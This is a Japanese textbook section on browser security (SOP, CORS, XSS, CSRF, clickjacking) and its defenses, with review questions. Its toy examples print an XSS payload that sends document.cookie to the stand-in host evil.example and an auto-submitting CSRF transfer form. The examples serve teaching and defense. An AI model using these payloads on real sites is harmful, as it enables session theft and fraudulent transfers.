### 前節（7-10）の確認問題の解答

前節の最後に提示した3つの問いの解答を確認します。問3がそのまま本節（Web アプリケーションの脆弱性とブラウザ保護機構）の導入になります。

1. **パスワード保存と JWT 設計のバグ診断：**

    * **(a) ソルトとメモリハード KDF（Argon2id）がそれぞれ防ぐ攻撃：**

        * **① ユーザ固有のソルト：** 同じパスワードを使う複数ユーザのハッシュ値が一致するのを防ぎ、頻出パスワード群のハッシュ値を事前計算しておく**レインボーテーブル攻撃**（および同一パスワードの一斉特定）を無力化します。
        * **② Argon2id のようなメモリハードなストレッチング関数：** 1 回の検証に意図的な時間コストと数十 $\text{MiB}$ の RAM ランダムアクセスを要求することで、DB 漏洩後に攻撃者が GPU や専用 ASIC で行う**超並列オフライン辞書・総当たり攻撃**を物理的に抑止します。

    * **(b) 有効期限 30 日・クレジットカード末尾入り JWT の 2 つの問題と修正：**

        * **① 機密情報の扱い：** JWT の Payload は暗号化されておらず単なる Base64URL エンコード（平文）であるため、クライアント側やログから誰でも中身を読めます。修正として、Payload には `sub`（ユーザ ID）や `role`、`exp` といった最小限の非機密クレームだけを入れ、カード情報などの機密データは入れません。
        * **② 即時失効不能：** ステートレス JWT は一度発行すると 30 日間の有効期限が切れるまで無効化できず、端末紛失やアカウント凍結時に不正利用を止められません。修正として、アクセストークン（JWT）の有効期限を **5〜15 分程度** へ短縮し、サーバ側で失効管理できる **リフレッシュトークン（ローテーション付き）** と組み合わせるか、通常の Web アプリであればサーバ側で即時削除できるステートフル・セッション方式を採用します。

2. **OAuth 2.0 ＋ PKCE・OIDC・パスキーの仕組み比較：**

    * **(a) ID トークンの必要性と PKCE の防御仕組み：**

        * **① ID トークンが必要な理由：** OAuth 2.0 は外部アプリへ特定範囲の API 権限を委譲する「認可」プロトコルであり、アクセストークン自体はクライアントに対して標準形式で「誰がログインしたか（認証）」を証明しません。そこで OpenID Connect（OIDC）は認可サーバが署名した **ID トークン（JWT）** を返すことで、クライアントが安全に本人確認できるようにしています。
        * **② PKCE が認可コード横取りを防ぐ仕組み：** クライアントは認可要求時に一時乱数 `code_verifier` のハッシュ `code_challenge` だけを送ります。たとえ攻撃者がリダイレクト経路上で認可コード `code` を横取りしても、元の秘密乱数 `code_verifier` を知らないため、バックチャネルのトークン交換で `SHA-256(code_verifier) == code_challenge` の検証を通過できずトークンを取得できません。

    * **(b) パスキー（WebAuthn）がリアルタイム・フィッシングに強い理由：**
        パスワードと SMS コードは人間が偽サイトへ手入力すると攻撃者プロキシ経由で本物サイトへ中継できてしまいます。一方パスキーでは、**ブラウザ自身がアドレスバーの正規オリジン（ドメイン名）を検証して署名対象データへ自動的に組み込む** ため、偽サイト `examp1e.com` を開いても `example.com` 用の秘密鍵がそもそも使われず（仮に別鍵で署名してもオリジン不一致で本物サーバに拒否され）、フィッシングが構造的に成立しません。

3. **ブラウザの Cookie 自動送信とサイト間の隔離境界（本節への接続）：**
    ブラウザが異なるサイト間でのデータ読み取りや DOM 操作を遮断する基本ルールは **同一オリジンポリシー（SOP：Same-Origin Policy）** です。一方、SOP が存在しても別サイト上のフォーム送信などにブラウザが対象サイトの Cookie を自動で添付して送ってしまう仕様を悪用し、ユーザの意図しない送金や設定変更を実行させる攻撃が **CSRF（クロスサイトリクエストフォージェリ）** です。本節では、SOP・CORS と XSS・CSRF・クリックジャッキングの攻防を体系的に整理します。

## 7-11. Web アプリケーションの脆弱性とブラウザ保護機構（SOP・CORS・XSS・CSRF）

### 1. 動機（Why）：TLS もパスキーも導入したのに、なぜ「ブラウザの上」でアカウントが乗っ取られるのか

[7-7節](7-7.md)で通信路を暗号化する **TLS 1.3** を、[7-10節](7-10.md)でパスワードレスの **パスキー** や **OAuth 2.0 / OIDC** を学びました。これで通信路もログインも堅固になったように見えます。

ところが、現代の Web ブラウザは「銀行サイト」「社内管理画面」「見知らぬニュースサイト」「広告スクリプト」という**信頼レベルのまったく異なる多数のプログラム（HTML / JavaScript）を、同じ 1 つのブラウザプロセス群の中で同時にダウンロードして実行する**という、OS から見れば非常に特殊な実行環境です。

ここでブラウザと Web アプリ開発者は、次の 3 つの厄介な境界問題に直面します。

1. **サイト同士の隔離（サンドボックス境界）：**
    別タブで開いた悪意あるサイト `evil.example` の JavaScript が、隣のタブでログイン中の `bank.example` の残高画面を覗き見たり、勝手に送金 API を叩いたりできないようにする強固な壁が必要です（**同一オリジンポリシー：SOP**）。一方で、正規のフロントエンド（`app.example.com`）から別ドメインの API（`api.example.com`）へ安全に通信したい場面では、サーバ側の明示許可で壁に小さな穴を開ける仕組みも要ります（**CORS**）。

2. **「信頼されたサイトの内側」へのスクリプト注入（XSS）：**
    ブラウザがどれほど `evil.example` を外へ締め出しても、本物の `bank.example` 自身の HTML 生成にバグがあり、攻撃者の `<script>` が本物サイトのページ内へ混入してしまえば、ブラウザはそれを「本物の `bank.example` の正規コード」と信じて実行してしまいます（**XSS**）。

3. **ブラウザの「親切な自動送信」の悪用（CSRF）：**
    ブラウザはユーザの利便性のため、あるサイト宛てのリクエストへそのサイトの Cookie を**自動で添付**します。この仕様により、外部の悪意あるサイトから本物サイトへの書き込みリクエストをブラウザに踏ませるだけで、ログイン済みの権限を勝手に使われてしまいます（**CSRF**）。

本節では、[第7部](../index.md#part-7)の締めくくりとして、ブラウザセキュリティの土台である **SOP と CORS**、および Web アプリの代表的脅威である **XSS・CSRF・クリックジャッキング** の発生原理と多層防御を整理します。

### 2. 具体例と動作イメージ（Toy Model）

規則の網羅に入る前に、2 つの短いコード例で「XSS」と「CSRF」が成立する瞬間を具体的に追ってみます。

#### 実験A：掲示板の検索結果ページで起きる「XSS（クロスサイトスクリプティング）」

ある Web サイトの検索結果ページが、URL のクエリ `?q=...` を受け取って、そのまま文字列結合で HTML へ埋め込んでいるとします。

```html
<!-- 脆弱なサーバが生成する HTML -->
<p>検索キーワード: <!-- ここへユーザ入力をそのまま埋め込む --> </p>
```

通常のユーザが `?q=コンピュータ` と検索すれば `<p>検索キーワード: コンピュータ</p>` と表示されるだけです。ところが、攻撃者が次のような細工 URL を作って被害者にクリックさせたとします。

```text
https://shop.example/search?q=<script>fetch('https://evil.example/steal?c='+document.cookie)</script>
```

サーバが入力値を無害化（エスケープ）せずそのまま HTML へ出力すると、被害者のブラウザには

```html
<p>検索キーワード: <script>fetch('https://evil.example/steal?c='+document.cookie)</script></p>
```

が届きます。ブラウザの HTML パーサは `<script>` を「`shop.example` 自身が配信した正規の JavaScript」としてそのまま実行してしまい、被害者の Cookie や画面内の個人情報・CSRF トークンが攻撃者サーバへ送信されてしまいます。

#### 実験B：悪意あるサイトの隠しフォーム 1 つで送金が走る「CSRF（クロスサイトリクエストフォージェリ）」

銀行サイト `https://bank.example` が、Cookie 認証（`sid=...`）だけで次のような送金 `POST` を受け付けているとします。

```http
POST /transfer HTTP/1.1
Host: bank.example
Cookie: sid=9f8a7b...

to=bob&amount=10000
```

被害者が `bank.example` へログインしたまま、別タブで攻撃者の悪意あるページ `https://evil.example/free-gift.html` を開いた瞬間、ページ内に仕込まれた次の隠しフォームが自動送信されます。

```html
<!-- evil.example に仕込まれた隠しフォーム -->
<form id="f" action="https://bank.example/transfer" method="POST">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="500000">
</form>
<script>document.getElementById('f').submit();</script>
```

被害者のブラウザは `https://bank.example/transfer` へ向けて `POST` を送り、しかも**宛先が `bank.example` であるため、保存していた正規の認証 Cookie（`sid=9f8a7b...`）を自動で添付**してしまいます。`bank.example` のサーバからは「正規のログイン済みユーザ本人からの送金要求」とまったく見分けがつかず、50 万円が攻撃者へ送金されてしまいます。

### 3. 構造・アルゴリズム・実装（What）

#### (1) 同一オリジンポリシー（SOP）と CORS（オリジン間リソース共有）

ブラウザセキュリティの根幹にある隔離ルールが **同一オリジンポリシー（SOP：Same-Origin Policy）** です。ブラウザはすべての Web ページを、URL の次の **3 つ組（オリジン：Origin）** 単位で厳格に隔離します（図7-11-1左）。

$$
\text{Origin} \;=\; (\;\text{スキーム},\;\; \text{ホスト名},\;\; \text{ポート番号}\;)
$$

基準 URL を **`https://app.example.com:443/index.html`**（HTTPS の既定ポートは `443`）としたとき、他の URL が同一オリジンかどうかは次の通り厳密に判定されます。

| 比較対象の URL | 判定 | 理由 |
| :--- | :---: | :--- |
| `https://app.example.com/profile` | **同一** | パス（`/profile`）の違いは無視される |
| `http://app.example.com/index.html` | **異なる** | スキームが異なる（`http` vs `https`） |
| `https://api.example.com/v1/users` | **異なる** | ホスト名（サブドメイン）が異なる |
| `https://app.example.com:8443/index.html` | **異なる** | ポート番号が異なる（`443` vs `8443`） |

* **SOP が許すことと禁じること：**
    SOP の本質は **「別オリジンからの『読み取り（Read）』を原則禁止する」** ことです。たとえば `evil.example` から `bank.example` の画像を `<img>` で表示したり、実験Bのように `<form>` で書き込みリクエストを送信したりすることは歴史的互換性から許可されますが、`evil.example` の JavaScript が `fetch('https://bank.example/balance')` の**レスポンス本文を読み取ったり**、`bank.example` の DOM や `localStorage` へアクセスしたりすることはブラウザが厳格に遮断します。

* **CORS（Cross-Origin Resource Sharing）：**
    現代の Web アプリでは、フロントエンド（`https://app.example.com`）の JavaScript から別オリジンの API サーバ（`https://api.example.com`）の JSON データを正規に読み取りたい場面が日常的にあります。そこで「API サーバ側が HTTP レスポンスヘッダで『このオリジンからの読み取りは許可する』と明示的に宣言したときだけ、ブラウザが SOP の制限を緩和する」仕組みが **CORS** です（図7-11-1右）。

    1. **単純リクエスト：** `GET` や通常の `POST`（フォーム形式等）では、ブラウザがリクエストへ **`Origin: https://app.example.com`** ヘッダを自動付与して送信します。API サーバがレスポンスに **`Access-Control-Allow-Origin: https://app.example.com`** を返せば、ブラウザは JavaScript へレスポンス本文を渡します（返さなければブラウザが結果を破棄してエラーにします）。
    2. **プリフライトリクエスト（Preflight：`OPTIONS`）：** `PUT` / `DELETE` メソッドや `Content-Type: application/json`、`Authorization` ヘッダを含むリクエストは、サーバ側の状態を変える危険があるため、ブラウザは本リクエストを送る**前**に、まず **`OPTIONS`** メソッドで「このオリジンからこのメソッド・ヘッダを送ってよいか？」と事前確認（プリフライト）を行います。サーバが `Access-Control-Allow-Origin`・`Access-Control-Allow-Methods`・`Access-Control-Allow-Headers` で許可を返した場合に限り、本リクエストが送信されます。

#### (2) XSS（クロスサイトスクリプティング）の 3 類型と多層防御

**XSS（Cross-Site Scripting）** は、信頼されたサイト（`shop.example`）のオリジン内で攻撃者の任意 JavaScript を実行させる脆弱性です。SOP の壁の「内側」へ侵入するため、Cookie の窃取（`HttpOnly` がない場合）、画面の改ざん、被害者になりすました API 呼び出しのすべてが可能になります。発生経路によって次の 3 類型に分かれます。

1. **反射型 XSS（Reflected XSS）：** 実験Aのように、URL パラメータ等の入力がサーバのレスポンス HTML へそのまま反射して返される型です。
2. **格納型 XSS（Stored / Persistent XSS）：** 攻撃者が掲示板の投稿やプロフィール欄へ `<script>` を書き込んで DB へ保存させ、そのページを閲覧した**全ユーザ**のブラウザで発火させる最も被害が大きい型です。
3. **DOM ベース XSS（DOM-based XSS）：** サーバ側の HTML には問題がなく、クライアント側の JavaScript が `location.hash` 等の入力を安全な `textContent` ではなく危険な `element.innerHTML = ...` へ流し込むことで発火する型です。

**XSS に対する多層防御（図7-11-2左）：**

* **第 1 防衛線（根本対策：文脈に応じた出力エスケープと安全 API）：**
    HTML 本文へ値を出力するときは `<`, `>`, `&`, `"`, `'` をそれぞれ `&lt;`, `&gt;`, `&amp;`, `&quot;`, `&#39;` へ変換し（現代の React / Vue 等のテンプレートエンジンは既定で自動エスケープを行います）、URL 属性へ入れる値は `javascript:` スキームを拒否して `https://` 等へ限定し、DOM 操作では `innerHTML` を避けて `textContent` を使います。

* **第 2 防衛線（CSP：Content-Security-Policy）：**
    HTTP レスポンスヘッダで、ブラウザに対して「**どのオリジンから読み込んだスクリプト、あるいは正しい一回限り乱数（`nonce`）が付いた `<script nonce="...">` だけを実行許可する**」と宣言します（例：`Content-Security-Policy: script-src 'self' 'nonce-abc123'`）。万が一 HTML にエスケープ漏れがあっても、攻撃者が注入したインライン `<script>` や外部スクリプトの実行をブラウザ側で遮断できます。

* **第 3 防衛線（`HttpOnly` Cookie）：**
    認証用 Cookie に `HttpOnly` を付けておけば、仮に XSS が発火しても `document.cookie` によるセッション ID の直接持ち出しを防げます（ただし、そのページ上での代理操作自体は防げないため、第 1・第 2 防衛線が主軸です）。

#### (3) CSRF とクリックジャッキングの原理と防御

**CSRF（Cross-Site Request Forgery）** は、XSS のように被害サイトへコードを注入するのではなく、実験Bの通り「**ブラウザが宛先オリジンの Cookie を自動送信する仕様**」を悪用して、外部の悪意あるサイトから被害サイトの状態変更リクエストを送りつける攻撃です（図7-11-2右）。

**CSRF に対する標準防御：**

1. **CSRF トークン（Synchronizer Token パターン）：**
    サーバがセッションごとに予測不能な秘密乱数（CSRF トークン）を発行し、HTML フォームの隠しフィールドやカスタム HTTP ヘッダ（`X-CSRF-Token`）へ埋め込みます。リクエスト受信時にサーバ側でトークン一致を検証します。**SOP により、外部の `evil.example` は `bank.example` の HTML から CSRF トークンを読み取れない** ため、正しいリクエストを偽造できません。

2. **`SameSite` Cookie 属性：**
    認証 Cookie に **`SameSite=Lax`**（現代ブラウザの既定値：トップレベルの安全な `GET` 画面遷移を除き、他サイト起点の `POST` 等には Cookie を付けない）または **`SameSite=Strict`**（あらゆる他サイト起点リクエストへ Cookie を一切付けない）を設定します。

3. **カスタムヘッダ要求と `Origin` / `Referer` 検証：**
    API エンドポイントが `Content-Type: application/json` や `X-Requested-With` のようなカスタムヘッダを必須とすれば、単純な HTML フォームからは送信できず、JavaScript からの送信には必ず CORS プリフライト（`OPTIONS`）が走るため未許可オリジンを遮断できます。

また、CSRF と近縁の UI 乗っ取り攻撃に **クリックジャッキング（Clickjacking）** があります。攻撃者が悪意あるサイトの中に `bank.example` の送金確定ボタン画面を透明な `<iframe>`（`opacity: 0`）として重ね、その下に「景品をもらう」ボタンを配置して被害者にクリックさせる攻撃です。これに対しては、レスポンスヘッダで他サイトからの `<iframe>` 埋め込み自体を禁止する **CSP の `frame-ancestors 'none'`**（および旧来の `X-Frame-Options: DENY`）で完全に防御します。

> * **ブラウザ層の XSS（本節）：** 検索語や投稿「データ」が HTML 構文の「スクリプトコード（`<script>`）」として解釈される $\implies$ 防御は **エスケープと CSP** によるデータとコードの分離。
> * **データベース層の SQL インジェクション（[8-6節](../8/8-6.md)コラム）：** ユーザ入力「データ」が SQL 文の「命令（`' OR '1'='1`）」として構文解析される $\implies$ 防御は **プリペアドステートメント（AST 確定後の値バインド）** によるデータとコードの分離。
>
> 階層がハードウェアからブラウザ、データベースへ変わっても、ソフトウェアセキュリティの要諦は常に **「信頼できない外部データと、実行される命令（コード・構文）の境界を厳格に分離し続けること」** にあります。

### 4. 限界と補正（Critique & Adaptation）

#### (1) CORS のよくある誤解と危険な誤設定

開発現場で最も誤解されやすいのが **「CORS はサーバへの不正アクセスを防ぐファイアウォールではない」** という点です。CORS を強制しているのはあくまで**ブラウザ**であり、攻撃者が `curl` や自作の Python スクリプトから API を直接叩けば CORS 制限は一切働きません。API 自体のアクセス制御には必ず認証・認可（[7-10節](7-10.md)）が必要です。

また、CORS エラーを安易に消そうとして次のような誤設定をすると、SOP の保護が崩壊します。

* リクエストの `Origin` ヘッダを無検証でそのまま `Access-Control-Allow-Origin` へ反射コピーし、さらに `Access-Control-Allow-Credentials: true`（Cookie 送信許可）を付ける $\implies$ 世界中のあらゆる悪意あるサイト `evil.example` から、ログイン済みユーザの機密 API データを読み取り放題になってしまいます（※仕様上、`Access-Control-Allow-Origin: *` と `Credentials: true` の併用はブラウザが拒否しますが、リフレクションで任意のオリジンをそのまま返すとその安全装置すらすり抜けてしまいます）。
* **補正：** 許可するオリジンは必ず厳格な**完全一致のホワイトリスト**で検証します。

#### (2) サプライチェーン攻撃（外部 JS 改ざん）と SRI

現代の Web サイトは、解析ツールや UI ライブラリなど多数の外部 CDN スクリプト（`<script src="https://cdn.example/lib.js">`）を読み込みます。もし外部 CDN が侵害されて `lib.js` が改ざんされると、自サイトに XSS バグが 1 つもなくても、自サイトのオリジン内で悪意ある JS が実行されてしまいます。

* **補正（SRI：Subresource Integrity）：** `<script>` タグへ期待する暗号学的ハッシュ値を埋め込みます（`<script src="..." integrity="sha384-..." crossorigin="anonymous">`）。ブラウザはダウンロードしたファイルのハッシュを検証し、1 ビットでも改ざんされていれば実行を拒否します。

#### (3) ブラウザと通信の保護の先にある「データ永続化の壁」（第8部への接続）

[7-7](7-7.md)〜7-11節を通じて、通信路の暗号化（TLS 1.3）、圧縮（DEFLATE / JPEG / 動画）、Web 認証・認可（Argon2id / OAuth / パスキー）、そしてブラウザ防御（SOP / CORS / XSS / CSRF）がすべて揃いました。

しかし、これらすべてで守られた安全なステートレス Web サーバ群の背後に、**「複数のサーバから同時に読み書きされる顧客データや在庫データ」** を置く段になると、単なる共有 CSV ファイルやローカルファイルシステムだけではデータの不整合・破損・検索劣化を防げません。次節から始まる **[第8部](../index.md#part-8)（関係データモデル・正規化と SQL）** では、このデータの論理設計と一貫性を支える **データベース管理システム（DBMS）** の世界へ進みます。

### 理解度チェック（第8部へ進む前の確認）

本節の SOP・CORS・XSS・CSRF の原理と防御を確認し、[第8部](../index.md#part-8)（データベース）へ繋ぐ問いを置きます。

> **【確認の問い】**
>
> 1. **（同一オリジン判定と CORS プリフライト・誤設定の診断）**
>
>     * (a) 基準 URL `https://app.example.com/dashboard` に対して、次の ①〜④ がそれぞれ同一オリジンか異なるオリジンかを理由とともに判定してください。
>         ① `https://app.example.com/settings/profile`
>         ② `http://app.example.com/dashboard`
>         ③ `https://api.example.com/dashboard`
>         ④ `https://app.example.com:8080/dashboard`
>
>     * (b) `https://app.example.com` の JavaScript から `https://api.example.com/orders/1` へ `DELETE` リクエストを送る前にブラウザが送信する **プリフライトリクエスト** の HTTP メソッド名を答え、さらに API サーバ側で「リクエストの `Origin` ヘッダを無検証でそのまま `Access-Control-Allow-Origin` へ反射コピーし、`Access-Control-Allow-Credentials: true` を返す」設定が重大な危険を伴う理由を説明してください。
>
> 2. **（XSS と CSRF の攻撃構造と防御策の精密比較）**
>
>     * (a) **XSS** 対策として認証 Cookie に `HttpOnly` を設定することは有効ですが、「`HttpOnly` さえ付けておけば XSS による被害はすべて防げる」という主張は誤りです。なぜ誤りなのかを説明したうえで、XSS を根本から防ぐための 2 つの主要対策（出力エスケープと CSP）の役割を述べてください。
>     * (b) **CSRF** 対策として「**CSRF トークン**（HTML フォームへ秘密乱数を埋め込みサーバで照合）」が機能する理由は、ブラウザの **同一オリジンポリシー（SOP）** のどの性質に支えられているでしょうか。また、`SameSite=Lax` Cookie が CSRF を抑止する仕組みも 1 文で添えてください。
>
> 3. **（第8部への伏線：TLS・Web 保護を備えたステートレス Web サーバ群と共有 CSV ファイルの限界）**
>     [第5部](../index.md#part-5)のファイルシステム、[7-5節](7-5.md)の水平スケールしやすいステートレスな Web サーバ（HTTP）、そして [7-7](7-7.md)・[7-10](7-10.md)・本節の暗号・認証・Web 保護によって、安全に通信できる基盤が整いました。ここで、EC サイトのバックエンドで複数台のステートレスな Web サーバが、ネットワーク経由で共有された **1 つの CSV ファイル（在庫台帳）** へ直接同時読み書きする構成を考えます。通信路や Web 認証がどれほど強固であっても、多数のユーザが同時に商品を購入したときに **在庫数の不整合・ファイル破損・検索性能の悪化** が生じるのはなぜでしょうか。既習知識（OS の並行処理・ファイル入出力・HTTP のステートレス性）を踏まえて説明してください。
